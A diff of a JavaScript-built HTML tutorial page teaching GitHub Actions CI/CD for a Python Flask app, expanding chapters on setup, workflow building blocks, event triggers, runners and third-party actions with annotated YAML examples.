+function table(headers,rows){return`<table class="compare-table"><thead><tr>${headers.map(h=>`<th>${h}</th>`).join('')}</tr></thead><tbody>${rows.map(r=>`<tr>${r.map(c=>`<td>${c}</td>`).join('')}</tr>`).join('')}</tbody></table>`;}
+function sec(id,n,icon,title,lead,body){return`<section id="${id}"><div class="sec-header"><div class="sec-number">Chapter ${n}</div><h2><span class="sec-icon">${icon}</span>${title}</h2><div class="sep"></div><p class="lead">${lead}</p></div>${body}</section>`;}
 
-function featureGrid(items){
-return`<div class="feature-grid">${items.map(i=>`<div class="feature-card"><div class="fi">${i[0]}</div><div class="ft">${i[1]}</div><div class="fd">${i[2]}</div></div>`).join('')}</div>`;
-}
-
-function stepFlow(steps){
-return`<div class="steps">${steps.map((s,i)=>`<div class="step"><div class="step-line"><div class="step-num">${i+1}</div>${i<steps.length-1?'<div class="step-connector"></div>':''}</div><div class="step-content"><div class="step-title">${s[0]}</div><div class="step-desc">${s[1]}</div></div></div>`).join('')}</div>`;
-}
-
-// Build main content
+// ═══════════════════════════════════════════
+// BUILD THE PAGE
+// ═══════════════════════════════════════════
 document.getElementById('mainContent').innerHTML=`
 
 <!-- HERO -->
 <div class="hero">
 <div class="hero-badges">
-<span class="badge badge-blue">BEGINNER → ADVANCED</span>
-<span class="badge badge-green">PYTHON + DEVOPS</span>
-<span class="badge badge-purple">HANDS-ON EXAMPLES</span>
+<span class="hero-badge hb-1">BEGINNER → ADVANCED</span>
+<span class="hero-badge hb-2">PYTHON + DEVOPS</span>
+<span class="hero-badge hb-3">19 CHAPTERS</span>
 </div>
-<h1>GitHub Actions masterclass</h1>
-<p>Master CI/CD from zero to production. Build, test, deploy, and secure Python applications using real-world DevOps workflows — every concept explained with working code.</p>
+<h1>GitHub Actions Masterclass</h1>
+<p>Master CI/CD from zero to production. Build, test, deploy, and secure Python applications using real-world DevOps workflows — every concept explained with deep theory and working code.</p>
 <div class="hero-stats">
-<span>📚 19 chapters</span>
-<span>💻 50+ examples</span>
-<span>🚀 Production-ready</span>
+<span>📚 19 in-depth chapters</span>
+<span>💻 50+ working examples</span>
+<span>📖 Complete theory coverage</span>
+<span>🚀 Production-ready pipelines</span>
 </div>
 </div>
 
-<!-- ===== 1. INTRODUCTION ===== -->
-<section id="intro">
-<h2><span class="sec-icon">🚀</span>Introduction</h2>
-<p class="desc">GitHub Actions is GitHub's built-in CI/CD and automation platform. It lets you automate your software development workflows directly in your GitHub repository. Every time something happens in your repo — a push, pull request, issue creation, or even a scheduled time — GitHub Actions can automatically run a series of commands for you.</p>
+<!-- ═══════ 1. INTRODUCTION ═══════ -->
+${sec("intro","01","🚀","Introduction",
+"Understand what GitHub Actions is, why it matters in modern DevOps, and how it compares to other CI/CD tools.",`
 
-<h3>Why GitHub Actions?</h3>
-${featureGrid([
-["🏠","Native to GitHub","No external CI/CD service needed. Lives right where your code is."],
-["💰","Free tier generous","2,000 minutes/month free for public repos, 500 for private."],
-["🛒","Marketplace","17,000+ pre-built actions ready to use from the community."],
-["📐","Matrix builds","Test across multiple OS, language versions, and configs in parallel."],
-["🔐","Secrets management","Built-in encrypted secrets for API keys, tokens, and credentials."],
-["🐳","Container support","Run jobs in Docker containers or build and push images natively."]
+${theory("What is CI/CD and why does it matter?",`
+<p><strong>Continuous Integration (CI)</strong> is a development practice where developers frequently merge their code changes into a shared repository — typically several times a day. Each merge triggers an automated build and test process. The core idea is simple: if you integrate small changes often, bugs are caught early, and the codebase stays healthy.</p>
+<p><strong>Continuous Delivery/Deployment (CD)</strong> extends CI by automatically preparing code for release to production (delivery) or actually deploying it (deployment). Together, CI/CD creates a pipeline that takes code from a developer's laptop to production with minimal manual intervention.</p>
+<p>Without CI/CD, teams face "integration hell" — merging weeks of work from multiple developers and spending days fixing conflicts and bugs. With CI/CD, every commit is validated automatically, and deployments become routine rather than stressful events.</p>
+`)}
+
+${theory("What exactly is GitHub Actions?",`
+<p>GitHub Actions is a <strong>workflow automation platform</strong> built directly into GitHub. Launched in 2019, it allows you to automate tasks in response to events in your repository. While it's most commonly used for CI/CD pipelines, it can automate virtually anything: labeling issues, sending notifications, generating documentation, or running scheduled maintenance scripts.</p>
+<p>Think of it this way: GitHub Actions is an event-driven system. Something happens in your repo (a <em>trigger</em>), and GitHub automatically runs a series of commands (a <em>workflow</em>) on a virtual machine (a <em>runner</em>) that GitHub provides for free.</p>
+<p>The key innovation is that it's <strong>native to where your code already lives</strong>. Unlike external CI/CD services (Jenkins, CircleCI, Travis CI) that require separate setup, configuration, and account management, GitHub Actions is a zero-configuration-to-start service that reads YAML files from your repository.</p>
+`)}
+
+<h3>Why choose GitHub Actions over alternatives?</h3>
+${table(["Feature","GitHub Actions","Jenkins","CircleCI","GitLab CI"],[
+["Setup","Zero — just add a YAML file","Complex — install & maintain server","Moderate — account + config","Built-in if using GitLab"],
+["Cost","2,000 free min/month (public repos unlimited)","Free (self-hosted) but infra costs","Limited free tier","400 free min/month"],
+["Marketplace","17,000+ pre-built actions","Plugins (varying quality)","Orbs ecosystem","Templates"],
+["Runner options","Hosted + self-hosted","Self-hosted only","Hosted + self-hosted","Hosted + self-hosted"],
+["YAML syntax","Native YAML workflows","Groovy Jenkinsfile","YAML config","YAML config"],
+["Learning curve","Low","High","Medium","Medium"]
 ])}
 
 <h3>What we'll build together</h3>
-<p class="desc">Throughout this guide, we'll build a complete CI/CD pipeline for a Python Flask application. Here's our example app:</p>
+<p class="desc">Throughout this entire guide, we'll use a <strong>Python Flask web application</strong> as our running example. This is a real-world app structure that represents what you'd actually build and deploy in production. Every workflow we create will be based on this project.</p>
 
-${code("app.py","python",`from flask import Flask, jsonify
+${code("app.py — Our Flask application","python",`from flask import Flask, jsonify
 
 app = Flask(__name__)
 
@@ -280,7 +347,7 @@ def health():
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)`)}
 
-${code("test_app.py","python",`import pytest
+${code("test_app.py — Our test suite","python",`import pytest
 from app import app
 
 @pytest.fixture
@@ -301,140 +368,152 @@ def test_health(client):
     assert resp.status_code == 200
     assert data["status"] == "ok"`)}
 
-${code("requirements.txt","text",`flask==3.0.0
+${code("requirements.txt — Python dependencies","text",`flask==3.0.0
 pytest==7.4.3
 flake8==6.1.0
 black==23.11.0
 safety==2.3.5
 bandit==1.7.6`)}
 
-${callout("info","Project structure","All workflow files live in <code>.github/workflows/</code> inside your repository. GitHub automatically detects YAML files here and registers them as workflows.")}
-</section>
+${callout("info","Key principle","All workflow files live in <code>.github/workflows/</code> inside your repository. GitHub automatically detects any <code>.yml</code> or <code>.yaml</code> file in this directory and registers it as a workflow. No additional configuration or dashboard setup needed.")}
+`)}
 
-<!-- ===== 2. TOOLS & SETUP ===== -->
-<section id="setup">
-<h2><span class="sec-icon">🔧</span>Tools & initial setup</h2>
-<p class="desc">Before writing your first workflow, you need your development environment ready. Here's everything you need set up step by step.</p>
+<!-- ═══════ 2. TOOLS & SETUP ═══════ -->
+${sec("setup","02","🔧","Tools & initial setup",
+"Set up your complete development environment for GitHub Actions — from installing prerequisites to creating your first passing workflow.",`
 
-<h3>Prerequisites</h3>
-${stepFlow([
-["GitHub account","Create one at github.com if you haven't. Enable 2FA for security."],
-["Git installed locally","Install via git-scm.com. Verify with: <code>git --version</code>"],
-["Python 3.9+ installed","Download from python.org. Verify with: <code>python --version</code>"],
-["VS Code (recommended)","Install the 'GitHub Actions' extension by GitHub for syntax highlighting and autocompletion."],
-["Create a new repository","On GitHub, create a new repo. Clone it locally. Add the app.py, test_app.py, and requirements.txt from above."]
+${theory("Understanding the development workflow",`
+<p>When working with GitHub Actions, your development flow looks like this: you write workflow YAML files locally in your code editor, commit them to your repository, and push to GitHub. GitHub detects the workflow files automatically and starts executing them based on the trigger conditions you defined.</p>
+<p>The feedback loop is: <strong>Edit YAML → Push → Watch logs in Actions tab → Fix issues → Repeat</strong>. Initially this loop can be slow, which is why having the right editor extensions (for syntax validation before pushing) is important.</p>
+`)}
+
+<h3>Prerequisites — step by step</h3>
+${steps([
+["GitHub account with 2FA enabled","Create at github.com. Two-factor authentication protects your account — essential since GitHub Actions can deploy to production systems."],
+["Git installed locally","Install from git-scm.com. This is how you'll push workflow files to trigger runs. Verify: <code>git --version</code>"],
+["Python 3.9+ installed","Download from python.org. Our example app uses Python, and you'll want to test locally before pushing. Verify: <code>python --version</code>"],
+["VS Code with GitHub Actions extension","Install the official <strong>GitHub Actions</strong> extension by GitHub. It provides syntax highlighting, autocompletion for workflow YAML, and inline validation that catches errors before you push."],
+["Create and clone a new repository","On GitHub: New Repository → name it → clone locally with <code>git clone</code>. Add the app.py, test_app.py, and requirements.txt files from Chapter 1."]
 ])}
 
 <h3>Repository structure</h3>
-${code("Project layout","text",`my-python-app/
+<p class="desc">A well-organized repository makes your CI/CD easier to maintain. Here's the structure we'll build toward throughout this guide:</p>
+
+${code("Complete project layout","text",`my-python-app/
 ├── .github/
-│   └── workflows/          # All workflow YAML files go here
-│       ├── ci.yml           # Our main CI pipeline
-│       ├── deploy.yml       # Deployment workflow
-│       └── reusable.yml     # Reusable workflow
-├── app.py                   # Flask application
-├── test_app.py              # Pytest tests
-├── requirements.txt         # Python dependencies
-├── Dockerfile               # Container definition
-├── .flake8                  # Linter config
+│   ├── actions/                 # Custom reusable actions (Ch.15)
+│   │   └── python-setup/
+│   │       └── action.yml
+│   └── workflows/               # All workflow YAML files
+│       ├── ci.yml               # Main CI pipeline
+│       ├── deploy.yml           # Deployment workflow
+│       └── reusable-ci.yml      # Reusable workflow (Ch.16)
+├── app.py                       # Flask application
+├── test_app.py                  # Pytest tests
+├── requirements.txt             # Python dependencies
+├── Dockerfile                   # Container definition
+├── .flake8                      # Linter configuration
 └── README.md`)}
 
-<h3>Your first workflow file</h3>
-<p class="desc">Create <code>.github/workflows/ci.yml</code> — this is the simplest possible workflow:</p>
-${code(".github/workflows/hello.yml","yaml",`name: Hello GitHub Actions     # Display name in the Actions tab
+<h3>Your first workflow — hello world</h3>
+<p class="desc">Let's create the simplest possible workflow to verify everything works. Create the file <code>.github/workflows/hello.yml</code> in your repository:</p>
 
-on: [push]                      # Trigger: runs on every push
+${code(".github/workflows/hello.yml","yaml",`name: Hello GitHub Actions
+
+on: [push]
 
 jobs:
-  greet:                        # Job ID (must be unique within workflow)
-    runs-on: ubuntu-latest      # Runner: GitHub-hosted Ubuntu machine
+  greet:
+    runs-on: ubuntu-latest
     steps:
-      - name: Say hello         # Step name (descriptive label)
+      - name: Say hello
         run: echo "Hello from GitHub Actions! 🚀"
 
       - name: Show environment info
         run: |
           echo "Repository: \${{ github.repository }}"
           echo "Branch: \${{ github.ref_name }}"
-          echo "Actor: \${{ github.actor }}"
+          echo "Triggered by: \${{ github.actor }}"
           echo "Event: \${{ github.event_name }}"
-          python3 --version`)}
+          python3 --version
+          uname -a`)}
 
-${callout("success","Try it now","Commit and push this file. Go to your repo's <strong>Actions</strong> tab — you'll see the workflow running. Click into it to watch the live logs. That's your first CI pipeline!")}
-</section>
+${callout("success","Try it now!","Commit and push this file: <code>git add . && git commit -m 'Add first workflow' && git push</code>. Then go to your repo's <strong>Actions</strong> tab on GitHub. You'll see the workflow running with a yellow spinner. Click into it to watch live logs. When it turns green — congratulations, you've built your first CI pipeline!")}
+`)}
 
-<!-- ===== 3. BUILDING BLOCKS ===== -->
-<section id="blocks">
-<h2><span class="sec-icon">🧱</span>GitHub Actions building blocks</h2>
-<p class="desc">Every workflow is made of the same fundamental pieces. Understanding them is the key to mastering GitHub Actions.</p>
+<!-- ═══════ 3. BUILDING BLOCKS ═══════ -->
+${sec("blocks","03","🧱","Building blocks",
+"Understand the five fundamental components that make up every GitHub Actions workflow — and how they fit together.",`
 
-${diagram(`┌─────────────────────────────────────────────────┐
-│                  WORKFLOW (.yml file)            │
-│                                                  │
-│  ┌──────────────────┐   ┌──────────────────┐    │
-│  │     JOB 1        │   │     JOB 2        │    │
-│  │  (runs on VM 1)  │──▶│  (runs on VM 2)  │    │
-│  │                   │   │                   │    │
-│  │  ┌─────────────┐ │   │  ┌─────────────┐ │    │
-│  │  │   Step 1    │ │   │  │   Step 1    │ │    │
-│  │  │ (checkout)  │ │   │  │  (deploy)   │ │    │
-│  │  └──────┬──────┘ │   │  └─────────────┘ │    │
-│  │  ┌──────▼──────┐ │   │                   │    │
-│  │  │   Step 2    │ │   └──────────────────┘    │
-│  │  │ (run tests) │ │                            │
-│  │  └──────┬──────┘ │       EVENT TRIGGER        │
-│  │  ┌──────▼──────┐ │    (push, PR, schedule,    │
-│  │  │   Step 3    │ │     manual, webhook)       │
-│  │  │  (lint)     │ │                            │
-│  │  └─────────────┘ │                            │
-│  └──────────────────┘                            │
-└─────────────────────────────────────────────────┘`)}
+${theory("The five building blocks",`
+<p>Every GitHub Actions workflow, no matter how complex, is built from exactly five components. Understanding their relationships is the single most important concept in this entire guide:</p>
+<ul>
+<li><strong>Workflow</strong> — A YAML file in <code>.github/workflows/</code>. It's the top-level container. A repository can have unlimited workflows, each triggered by different events.</li>
+<li><strong>Event</strong> — The trigger that starts a workflow. Could be a push, pull request, schedule, manual click, or even an API call from an external system.</li>
+<li><strong>Job</strong> — A group of steps that runs on the same virtual machine. A workflow can have multiple jobs. <strong>Jobs run in parallel by default</strong> — this is crucial to understand. If Job A and Job B have no dependency, they start simultaneously on separate machines.</li>
+<li><strong>Step</strong> — A single task inside a job. Steps always run <strong>sequentially</strong> within their job. Each step either runs a shell command (<code>run:</code>) or invokes a pre-built action (<code>uses:</code>).</li>
+<li><strong>Runner</strong> — The virtual machine that executes a job. GitHub provides hosted runners (Ubuntu, Windows, macOS) for free, or you can connect your own self-hosted runners.</li>
+</ul>
+`)}
 
-<h3>The hierarchy explained</h3>
-<p class="desc"><strong>Workflow:</strong> A configurable automated process defined in a YAML file. A repo can have many workflows, each triggered by different events.</p>
-<p class="desc"><strong>Job:</strong> A set of steps that execute on the same runner (virtual machine). Jobs run in parallel by default. You can make them sequential with <code>needs:</code>.</p>
-<p class="desc"><strong>Step:</strong> An individual task within a job. Each step either runs a shell command (<code>run:</code>) or uses a pre-built action (<code>uses:</code>). Steps always run sequentially within a job.</p>
-<p class="desc"><strong>Action:</strong> A reusable unit of code. Can be from the GitHub Marketplace, your own repo, or a Docker container.</p>
-<p class="desc"><strong>Runner:</strong> The server that runs your workflows. GitHub provides hosted runners (Ubuntu, Windows, macOS) or you can self-host your own.</p>
+${diagram(`┌──────────────────────── WORKFLOW (.yml file) ──────────────────────────┐
+│                                                                        │
+│   EVENT TRIGGER                                                        │
+│   (push, PR, schedule, manual, API webhook)                            │
+│           │                                                            │
+│           ▼                                                            │
+│   ┌───────────────────┐          ┌───────────────────┐                 │
+│   │      JOB 1        │          │      JOB 2        │                 │
+│   │  (Ubuntu runner)  │─ needs ─▶│  (Ubuntu runner)  │                 │
+│   │                   │          │                   │                 │
+│   │  ┌─────────────┐  │          │  ┌─────────────┐  │                 │
+│   │  │   Step 1    │  │          │  │   Step 1    │  │                 │
+│   │  │  checkout   │  │          │  │  download   │  │                 │
+│   │  └──────┬──────┘  │          │  │  artifact   │  │                 │
+│   │  ┌──────▼──────┐  │          │  └──────┬──────┘  │                 │
+│   │  │   Step 2    │  │          │  ┌──────▼──────┐  │                 │
+│   │  │  install    │  │          │  │   Step 2    │  │                 │
+│   │  │  deps       │  │          │  │  deploy     │  │                 │
+│   │  └──────┬──────┘  │          │  └─────────────┘  │                 │
+│   │  ┌──────▼──────┐  │          │                   │                 │
+│   │  │   Step 3    │  │          └───────────────────┘                 │
+│   │  │  run tests  │  │                                                │
+│   │  └─────────────┘  │                                                │
+│   └───────────────────┘                                                │
+└────────────────────────────────────────────────────────────────────────┘`)}
 
-${callout("warning","Key distinction","Jobs get their own fresh virtual machine — they share nothing by default. Steps within a job share the same filesystem and environment. This means if Step 1 installs Python packages, Step 2 can use them, but Job 2 cannot.")}
+${callout("warning","Critical concept: job isolation","Each job gets a <strong>completely fresh virtual machine</strong>. Jobs share nothing — no files, no installed packages, no environment variables. If Job 1 installs Python packages and creates build files, Job 2 cannot access any of them. To share data between jobs, you must use <strong>artifacts</strong> (Chapter 12) or <strong>job outputs</strong> (Chapter 11).")}
 
-<h3>Complete anatomy of a workflow file</h3>
-${code(".github/workflows/ci.yml — annotated","yaml",`# ──────────────────────────────────────────────────
-# LEVEL 1: Workflow metadata
-# ──────────────────────────────────────────────────
-name: Python CI Pipeline        # Shows in the Actions tab UI
+<h3>Complete annotated workflow</h3>
+<p class="desc">Here's a full workflow file with every line explained. Study this carefully — it's the template for everything that follows:</p>
 
-# ──────────────────────────────────────────────────
-# LEVEL 2: Event triggers — WHEN does this run?
-# ──────────────────────────────────────────────────
+${code(".github/workflows/ci.yml — fully annotated","yaml",`# ── LEVEL 1: Workflow metadata ──
+name: Python CI Pipeline
+
+# ── LEVEL 2: Event triggers — WHEN does this run? ──
 on:
   push:
     branches: [main, develop]
   pull_request:
     branches: [main]
 
-# ──────────────────────────────────────────────────
-# LEVEL 3: Environment variables (available to all jobs)
-# ──────────────────────────────────────────────────
+# ── LEVEL 3: Env vars available to ALL jobs ──
 env:
   PYTHON_VERSION: "3.11"
   APP_NAME: "my-python-app"
 
-# ──────────────────────────────────────────────────
-# LEVEL 4: Jobs — WHAT runs?
-# ──────────────────────────────────────────────────
+# ── LEVEL 4: Jobs — WHAT runs? ──
 jobs:
-  test:                          # Job ID
-    name: Run tests              # Display name
-    runs-on: ubuntu-latest       # Runner type
+  test:
+    name: Run tests
+    runs-on: ubuntu-latest
 
     steps:
       # Step using a pre-built action
       - name: Checkout code
         uses: actions/checkout@v4
 
-      # Step using a pre-built action with inputs
+      # Step using an action with configuration
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
@@ -449,67 +528,96 @@ jobs:
       # Step running tests
       - name: Run pytest
         run: pytest test_app.py -v --tb=short`)}
-</section>
 
-<!-- ===== 4. EVENT TRIGGERS ===== -->
-<section id="triggers">
-<h2><span class="sec-icon">⚡</span>Event triggers</h2>
-<p class="desc">The <code>on:</code> key defines when your workflow runs. GitHub supports 35+ event types. Here are the most important ones for CI/CD:</p>
+${theory("Understanding parallel vs sequential execution",`
+<p>This is where many beginners get confused, so let's be crystal clear:</p>
+<ul>
+<li><strong>Steps within a job</strong> → Always <strong>sequential</strong>. Step 2 waits for Step 1 to finish. They share the same filesystem.</li>
+<li><strong>Jobs within a workflow</strong> → <strong>Parallel by default</strong>. Unless you specify <code>needs:</code>, all jobs start at the same time on separate machines.</li>
+<li><strong>Workflows</strong> → <strong>Independent</strong>. If you have ci.yml and deploy.yml both triggered by push, they run as completely separate workflow instances.</li>
+</ul>
+<p>This parallel-by-default design is powerful — it means your lint, test, and security scan can all run simultaneously, cutting your total CI time dramatically.</p>
+`)}
+`)}
 
-${code("All major trigger types","yaml",`on:
-  # ── Code events ──
-  push:                          # Any push to the repo
-    branches: [main, develop]    # Only these branches
-  pull_request:                  # PR opened, updated, or reopened
-    branches: [main]
+<!-- ═══════ 4. EVENT TRIGGERS ═══════ -->
+${sec("triggers","04","⚡","Event triggers",
+"Master the event system that decides when your workflows run — from simple pushes to complex scheduled and manual triggers.",`
 
-  # ── Manual triggers ──
-  workflow_dispatch:             # "Run workflow" button in UI
-    inputs:                      # Custom inputs shown in UI
+${theory("How the event system works",`
+<p>GitHub's event system is the heartbeat of Actions. Every action taken in your repository generates an <strong>event</strong> — pushing code, opening a PR, creating an issue, publishing a release, even starring the repo. GitHub Actions lets you "subscribe" to these events using the <code>on:</code> keyword.</p>
+<p>Events carry a <strong>payload</strong> — a JSON object with details about what happened. For a push event, the payload includes the commits, the branch, the pusher's identity, and more. You can access this data in your workflow via the <code>github.event</code> context (covered in Chapter 8).</p>
+<p>There are three broad categories of events:</p>
+<ul>
+<li><strong>Webhook events</strong> — Triggered by GitHub activity: push, pull_request, issues, release, etc. These are the most common.</li>
+<li><strong>Scheduled events</strong> — Triggered by a cron schedule. Useful for nightly builds, weekly security scans, or periodic data processing.</li>
+<li><strong>Manual events</strong> — Triggered by a human clicking a button (<code>workflow_dispatch</code>) or an API call (<code>repository_dispatch</code>).</li>
+</ul>
+`)}
+
+<h3>All major trigger types with explanations</h3>
+${code("Complete trigger reference","yaml",`on:
+  # ── WEBHOOK EVENTS ──
+  push:                          # Fires when commits are pushed
+    branches: [main, develop]    # Only for these branches
+  
+  pull_request:                  # Fires on PR activity
+    branches: [main]             # Only PRs targeting main
+
+  # ── MANUAL TRIGGERS ──
+  workflow_dispatch:             # Adds "Run workflow" button in UI
+    inputs:
       environment:
         description: "Deploy target"
         required: true
         default: "staging"
         type: choice
-        options: [staging, production]
+        options:
+          - staging
+          - production
       debug:
         description: "Enable debug logging"
         type: boolean
         default: false
 
-  # ── Scheduled (cron) ──
+  # ── SCHEDULED TRIGGERS ──
   schedule:
-    - cron: "30 5 * * 1-5"      # 5:30 AM UTC, weekdays only
+    - cron: "30 5 * * 1-5"      # 5:30 AM UTC, Mon-Fri
+    # Format: minute hour day-of-month month day-of-week
     # ┬ ┬ ┬ ┬ ┬
-    # │ │ │ │ └── Day of week (0=Sun, 1=Mon ... 6=Sat)
+    # │ │ │ │ └── Day of week (0=Sun, 6=Sat)
     # │ │ │ └──── Month (1-12)
     # │ │ └────── Day of month (1-31)
-    # │ └──────── Hour (0-23)
+    # │ └──────── Hour (0-23, UTC)
     # └────────── Minute (0-59)
 
-  # ── Other repo events ──
+  # ── OTHER USEFUL EVENTS ──
   issues:
     types: [opened, labeled]
   release:
     types: [published]
-  workflow_call:                 # Called by another workflow
-  repository_dispatch:          # External webhook trigger`)}
+  workflow_call:                 # Makes this callable by other workflows
+  repository_dispatch:          # External API webhook trigger`)}
 
-<h3>Practical example: multi-trigger pipeline</h3>
-${code(".github/workflows/smart-ci.yml","yaml",`name: Smart CI
+${callout("info","Cron schedule tip","GitHub uses <strong>UTC time</strong> for all cron schedules. If you're in IST (UTC+5:30) and want a job to run at 9:00 AM IST, set the cron to <code>30 3 * * *</code> (3:30 AM UTC). Also note: scheduled workflows only run on the default branch (usually <code>main</code>).")}
+
+<h3>Practical example: smart multi-trigger pipeline</h3>
+<p class="desc">Here's a real-world workflow that uses multiple trigger types with different behavior for each:</p>
+
+${code(".github/workflows/smart-ci.yml","yaml",`name: Smart CI Pipeline
 
 on:
   push:
     branches: [main]
     paths:
-      - "**.py"                  # Only run if Python files change
+      - "**.py"
       - "requirements.txt"
       - "Dockerfile"
   pull_request:
     branches: [main]
   schedule:
-    - cron: "0 6 * * 1"         # Weekly security scan, Monday 6AM
-  workflow_dispatch:             # Manual trigger for emergencies
+    - cron: "0 6 * * 1"         # Weekly Monday 6AM UTC
+  workflow_dispatch:
 
 jobs:
   test:
@@ -523,6 +631,7 @@ jobs:
       - run: pytest test_app.py -v
 
   security-scan:
+    # Only on schedule or main branch push — not on PRs
     if: github.event_name == 'schedule' || github.ref == 'refs/heads/main'
     runs-on: ubuntu-latest
     steps:
@@ -530,45 +639,52 @@ jobs:
       - run: pip install safety bandit
       - run: safety check -r requirements.txt
       - run: bandit -r . -ll`)}
+`)}
 
-${callout("info","Pro tip: path filtering","Use <code>paths:</code> and <code>paths-ignore:</code> to avoid running expensive CI on documentation-only changes. This saves runner minutes and speeds up your feedback loop.")}
-</section>
+<!-- ═══════ 5. RUNNERS ═══════ -->
+${sec("runners","05","💻","Workflow runners",
+"Understand the machines that execute your code — GitHub-hosted runners, self-hosted options, containers, and service containers for databases.",`
 
-<!-- ===== 5. RUNNERS ===== -->
-<section id="runners">
-<h2><span class="sec-icon">💻</span>Workflow runners</h2>
-<p class="desc">Runners are the machines that execute your jobs. GitHub provides hosted runners, or you can set up your own self-hosted runners for custom needs.</p>
+${theory("What is a runner?",`
+<p>A runner is a <strong>virtual machine</strong> (or physical machine) that executes the steps in your job. When a job starts, GitHub provisions a fresh VM, runs your steps, and then destroys it. Every job gets a brand-new machine — nothing persists between runs unless you use caching or artifacts.</p>
+<p><strong>GitHub-hosted runners</strong> are free VMs managed by GitHub. They come pre-installed with common tools (Git, Docker, Python, Node.js, etc.) and are the easiest option. For most projects, these are all you need.</p>
+<p><strong>Self-hosted runners</strong> are machines you manage yourself — physical servers, cloud VMs, or even Raspberry Pis. You'd use these when you need GPU access, specific hardware, internal network access, or to avoid minute limits.</p>
+`)}
 
-<h3>GitHub-hosted runners</h3>
-${featureGrid([
-["🐧","ubuntu-latest","Ubuntu 22.04. Most common. 2-core, 7GB RAM, 14GB SSD."],
-["🪟","windows-latest","Windows Server 2022. For .NET, PowerShell, or Windows-only builds."],
-["🍎","macos-latest","macOS 14 (Sonoma). For iOS/macOS builds. 3x the minute cost."],
-["🐧","ubuntu-24.04","Pin specific OS version for reproducibility instead of 'latest'."]
+${grid([
+["🐧","ubuntu-latest","Ubuntu 22.04 LTS. 2 CPU cores, 7GB RAM, 14GB SSD. Most popular choice."],
+["🪟","windows-latest","Windows Server 2022. 2 cores, 7GB RAM. Use for .NET or Windows-specific testing."],
+["🍎","macos-latest","macOS 14 Sonoma. 3 cores, 7GB RAM. Required for iOS/macOS builds. 10x cost!"],
+["🔒","self-hosted","Your own machines. Full control over hardware, software, and network access."]
 ])}
 
-<h3>Self-hosted runners & containers</h3>
-${code("Runners, containers, and services","yaml",`jobs:
+${code("Runners, containers, and service containers","yaml",`jobs:
+  # Standard hosted runner
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: pytest test_app.py -v
+
+  # Self-hosted with custom labels
   ml-training:
-    # Self-hosted runner with GPU and Linux
     runs-on: [self-hosted, linux, gpu]
     steps:
       - uses: actions/checkout@v4
-      - name: Train model
-        run: python train.py --epochs 100
+      - run: python train.py --epochs 100
 
-  # Use a container inside any runner
-  containerized-job:
+  # Run entire job inside a Docker container
+  containerized:
     runs-on: ubuntu-latest
     container:
-      image: python:3.11-slim    # Run entire job in this container
+      image: python:3.11-slim
       env:
         APP_ENV: testing
     steps:
       - uses: actions/checkout@v4
       - run: python -c "import sys; print(sys.version)"
 
-  # Service containers (databases, caches for testing)
+  # Service containers for integration testing
   integration-tests:
     runs-on: ubuntu-latest
     services:
@@ -595,106 +711,136 @@ ${code("Runners, containers, and services","yaml",`jobs:
           REDIS_URL: redis://localhost:6379
         run: pytest tests/integration/ -v`)}
 
-${callout("warning","Runner minute costs","Linux runners: 1x multiplier. Windows: 2x. macOS: 10x. For a budget-conscious project, run everything possible on Linux and only use macOS/Windows for platform-specific testing.")}
-</section>
+${callout("warning","Cost awareness","Linux: <strong>1x</strong> multiplier per minute. Windows: <strong>2x</strong>. macOS: <strong>10x</strong>. A 10-minute macOS job uses 100 minutes of your free quota. Run everything possible on Linux — only use macOS for platform-specific needs like iOS builds.")}
+`)}
 
-<!-- ===== 6. THIRD-PARTY ACTIONS ===== -->
-<section id="actions">
-<h2><span class="sec-icon">📦</span>Using third-party actions</h2>
-<p class="desc">Actions are reusable units of code that perform common tasks. The GitHub Marketplace has 17,000+ actions.</p>
+<!-- ═══════ 6. THIRD-PARTY ACTIONS ═══════ -->
+${sec("actions","06","📦","Using third-party actions",
+"Leverage the massive ecosystem of 17,000+ pre-built actions from the GitHub Marketplace to avoid reinventing the wheel.",`
 
-<h3>Action syntax</h3>
+${theory("Understanding actions as reusable building blocks",`
+<p>An <strong>action</strong> is a packaged, reusable unit of automation code. Instead of writing 20 lines of shell commands to set up Python with caching, you use a single line: <code>uses: actions/setup-python@v5</code>. The action handles all the complexity internally.</p>
+<p>Actions come in three flavors:</p>
+<ul>
+<li><strong>JavaScript actions</strong> — Written in Node.js, run directly on the runner. Fastest startup time.</li>
+<li><strong>Docker actions</strong> — Packaged in a Docker container. Guarantees exact environment but has slower startup.</li>
+<li><strong>Composite actions</strong> — Made of YAML steps. No coding required — just compose existing steps (we'll build these in Chapter 15).</li>
+</ul>
+<p>You reference actions using the syntax <code>owner/repo@ref</code>. The <code>@ref</code> can be a version tag (<code>@v4</code>), a branch (<code>@main</code>), or a commit SHA — each with different security implications.</p>
+`)}
+
 ${code("Action reference formats","yaml",`steps:
-  # Format: owner/repo@ref
-  - uses: actions/checkout@v4          # Official GitHub action
-  - uses: actions/setup-python@v5      # Another official action
+  # Major version tag — most common, auto-gets patches
+  - uses: actions/checkout@v4
 
-  # Pin to exact commit SHA (most secure)
+  # Exact commit SHA — most secure, immune to tag hijacking
   - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
 
-  # Use a Docker Hub image directly
+  # Docker Hub image — run any container as an action
   - uses: docker://alpine:3.18
 
-  # Use action from the same repository
+  # Local action — from the same repository
   - uses: ./.github/actions/my-custom-action`)}
 
-<h3>Essential actions for Python DevOps</h3>
-${code("Must-know actions","yaml",`jobs:
+<h3>Essential Python DevOps actions</h3>
+${code("Complete pipeline with third-party actions","yaml",`jobs:
   full-pipeline:
     runs-on: ubuntu-latest
     steps:
+      # 1. Get your code
       - uses: actions/checkout@v4
         with:
-          fetch-depth: 0            # Full history for changelog
+          fetch-depth: 0
 
+      # 2. Setup Python with automatic pip caching
       - uses: actions/setup-python@v5
         with:
           python-version: "3.11"
-          cache: "pip"              # Auto-cache pip downloads
+          cache: "pip"
 
+      # 3-6. Quality checks
       - run: pip install -r requirements.txt
       - run: flake8 . --count --show-source --statistics
       - run: black --check .
       - run: pytest --cov=app --cov-report=xml -v
 
+      # 7. Upload coverage report
       - uses: codecov/codecov-action@v3
         with:
           files: ./coverage.xml
           fail_ci_if_error: true
 
+      # 8. Build Docker image
       - uses: docker/build-push-action@v5
         with:
           context: .
           push: false
           tags: myapp:test
 
+      # 9. Notify on failure
       - uses: slackapi/slack-github-action@v1.25.0
         if: failure()
         with:
           payload: |
-            {"text":"CI Failed on \${{ github.repository }}"}
